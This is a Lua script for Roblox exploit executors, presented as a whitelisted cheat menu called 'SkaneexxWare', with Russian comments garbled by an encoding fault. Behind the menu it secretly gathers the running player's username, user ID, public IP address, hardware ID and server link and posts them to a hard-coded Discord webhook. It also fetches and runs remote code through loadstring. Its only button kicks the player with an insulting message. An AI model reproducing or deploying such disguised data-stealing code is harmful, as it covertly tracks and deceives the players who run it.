local whitelistURL = "https://raw.githubusercontent.com/NotSkaneexx/testwhitelist/refs/heads/main/names" -- –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Å–≤–æ–π

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- –ü—ã—Ç–∞–µ–º—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å whitelist —Å Pastebin
local success, response = pcall(function()
    return game:HttpGet(whitelistURL)
end)

if success then
    -- –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —Å—Ç—Ä–æ–∫—É –≤ —Ç–∞–±–ª–∏—Ü—É
    local whitelist = {}
    for name in response:gmatch("[^\r\n]+") do
        whitelist[name] = true
    end

    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–≥—Ä–æ–∫–∞
    if whitelist[LocalPlayer.Name] then
        print("‚úÖ –í whitelist! –ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞...")

        -- –ó–¥–µ—Å—å —Ç–≤–æ–π –æ—Å–Ω–æ–≤–Ω–æ–π —Å–∫—Ä–∏–ø—Ç üëá
        -- –ù–∞–ø—Ä–∏–º–µ—Ä:
local webhookURL = "https://discord.com/api/webhooks/1348641898667049083/MzXyiKLbS9uqGWUekaIdojhfjETp302LMQ_inanKqJRZCvpmL_NYWD5r3tVS5-2k-Rky"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- –ü–æ–ª—É—á–∞–µ–º IP
local ip = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ."
pcall(function()
    ip = game:HttpGet("https://api.ipify.org")
end)

local hwid = "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ."
pcall(function()
    if syn and syn.crypt then
        hwid = syn.crypt.hash(tostring(syn.crypt.random(32)))
    elseif gethwid then
        hwid = gethwid()
    end
end)

local profileURL = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
local serverURL = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

-- –§–æ—Ä–º–∏—Ä—É–µ–º Webhook embed
local data = {
    ["username"] = "—à–ª—é—Ö–∞",
    ["embeds"] = {{
        ["title"] = "üö® –ò–≥—Ä–æ–∫ –∑–∞–ø—É—Å—Ç–∏–ª —Å–∫—Ä–∏–ø—Ç",
        ["color"] = 16711680,
        ["url"] = profileURL,
        ["thumbnail"] = { ["url"] = avatarURL },
        ["fields"] = {
            { name = "üë§ Username", value = LocalPlayer.Name, inline = true },
            { name = "ü™™ Display Name", value = LocalPlayer.DisplayName, inline = true },
            { name = "üÜî UserId", value = tostring(LocalPlayer.UserId), inline = true },
            { name = "üåê IP", value = ip, inline = false },
            { name = "üß¨ HWID", value = hwid, inline = false },
            { name = "üéÆ Game ID", value = tostring(game.PlaceId), inline = true },
            { name = "üîó –°–µ—Ä–≤–µ—Ä", value = "[–ó–∞–π—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä.](" .. serverURL .. ")", inline = false },
            { name = "üïí –í—Ä–µ–º—è", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false }
        },
        ["footer"] = {
            ["text"] = "„É° SkaneexxWare Version 3.9.7"
        }
    }}
}

local json = HttpService:JSONEncode(data)

local req = request or http_request or (syn and syn.request)
if req then
    req({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
else
    warn("–ò–Ω–∂–µ–∫—Ç–æ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç HTTP-–∑–∞–ø—Ä–æ—Å—ã.")
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Window = Rayfield:CreateWindow({
	Name = "„É° SkaneexxWare | Version 3.9.7",
	LoadingTitle = "by skaneexx",
	LoadingSubtitle = "loading...",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "ChamsConfig",
		FileName = "Settings"
	}
})

local MainTab = Window:CreateTab("üè° Main", nil)

-- –ö–Ω–æ–ø–∫–∞
MainTab:CreateButton({
    Name = "–ó–∞–ø—É—Å—Ç–∏—Ç—å –æ—Å–Ω–æ–≤–Ω–æ–π —Å–∫—Ä–∏–ø—Ç.",
    Callback = function()
game.Players.LocalPlayer:Kick("–•–∞—Ö–∞—Ö–∞, –µ–±–∞—Ç—å, —Ç—ã —Ä–µ–∞–ª—å–Ω–æ –ø–æ–¥—É–º–∞–ª —Ç–æ —á—Ç–æ —è –ø—Ä–æ —Ç–µ–±—è –∑–∞–±—ã–ª –∏ –Ω–µ —É–±—Ä–∞–ª —Å –≤–∞–π—Ç –ª–∏—Å—Ç–∞? –∫–∞–∫–æ–π –∂–µ —Ç—ã –≥–ª—É–ø—ã–π, –ø–æ—à–µ–ª –Ω–∞—Ö—É–π –æ—Ç—Å—é–¥–æ–≥–æ.")
    end,
})

    else
game.Players.LocalPlayer:Kick("\n\n–í—ã –Ω–µ –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ whitelist, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–∫—Ä–∏–ø—Ç—É –∑–∞–π–¥–∏—Ç–µ –Ω–∞ –¥–∏—Å–∫–æ—Ä–¥ —Å–µ—Ä–≤–µ—Ä. (—Å—Å—ã–ª–∫–∞ –±—É–¥–µ—Ç –Ω–∏–∂–µ).\n\ndiscord.gg/ZMHrjFEq4N\n\n –£–¥–∞—á–∏!")
